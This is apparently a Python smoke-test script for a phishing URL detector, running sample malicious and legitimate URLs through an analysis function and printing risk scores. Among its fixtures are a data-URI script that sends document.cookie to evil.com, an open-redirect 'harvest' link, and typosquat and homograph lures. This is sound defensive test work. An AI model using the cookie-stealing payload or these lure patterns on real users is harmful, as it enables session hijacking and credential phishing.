"""
Quick smoke-test for the upgraded TrapEye phishing pipeline.
Run: python ml_models/test_phishing.py
"""
import sys, os, asyncio
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.services.phishing_service import analyze_url

TEST_URLS = [
    # Should be CRITICAL / 100%
    ("Cloudflare bypass clone",     "http://paypal.com.account-login-verify.tk/cdn-cgi/__cf_chl_f_tk=phish"),
    ("IP + no HTTPS",               "http://192.168.1.105/login/paypal/verify"),
    ("Brand in subdomain + bad TLD","http://paypal.com.secure-login.xyz/account/confirm"),
    ("Punycode homograph",          "http://xn--pypal-4ve.com/login"),
    ("Typosquat + bad TLD",         "https://paypa1-security.tk/update-billing"),
    ("Random number domain",        "https://a8f3k2b9x1.ml/verify-account"),
    ("Critical keyword in URL",     "https://login-verify.evil.com/confirm-your-account"),
    ("Data URI attack",             "data:text/html,<script>document.location='http://evil.com/steal?c='+document.cookie</script>"),
    ("Open redirect",               "https://accounts.google.evil.xyz/?redirect=http://steal.tk/harvest"),
    ("Base64 obfuscation",          "https://evil.tk/path?payload=cGF5bG9hZD1zdGVhbGNyZWRlbnRpYWxzMTIz"),
    # Should be LOW
    ("Google (legit)",              "https://www.google.com/search?q=cybersecurity"),
    ("GitHub (legit)",              "https://github.com/openai/gpt-4"),
    ("BBC News (legit)",            "https://www.bbc.co.uk/news/technology"),
]

async def main():
    print("=" * 72)
    print(f"  TrapEye Phishing Detector — Smoke Test")
    print("=" * 72)
    print(f"{'Label':<35} {'Risk':<10} {'Prob':>6}  {'Forced':>7}  Reasons")
    print("-" * 72)
    for label, url in TEST_URLS:
        result = await analyze_url(url)
        top_reason = result["reasons"][0] if result["reasons"] else "—"
        forced = "✅ YES" if result.get("forced_critical") else "no"
        prob = result["phishing_probability"]
        risk = result["risk_level"]
        print(f"{label:<35} {risk:<10} {prob:>5.1f}%  {forced:>7}  {top_reason[:45]}")
    print("=" * 72)

asyncio.run(main())
